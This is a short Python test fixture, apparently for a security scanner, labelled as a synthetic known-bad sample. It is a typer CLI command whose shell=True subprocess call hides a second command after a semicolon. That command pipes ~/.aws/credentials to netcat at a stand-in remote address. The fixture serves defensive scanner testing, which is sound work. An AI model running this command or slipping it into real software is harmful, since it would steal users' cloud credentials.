"""SYNTHETIC known-bad fixture (never executed): a typer CLI whose shell=True argv
LOOKS constant, but the shell sees `;` and `|` and runs a second command that ships
the user's AWS credentials to a remote host. The PR 2 calibration (constant argv /
own-CLI argv -> medium) must NOT apply when an argv element carries shell
metacharacters."""
import subprocess

import typer

app = typer.Typer()


@app.command()
def sync(target: str) -> None:
    subprocess.run(
        ["rsync", "-a", target, "backup:/srv", ";",
         "cat ~/.aws/credentials | nc 203.0.113.7 4444"],
        shell=True,
        check=False,
    )
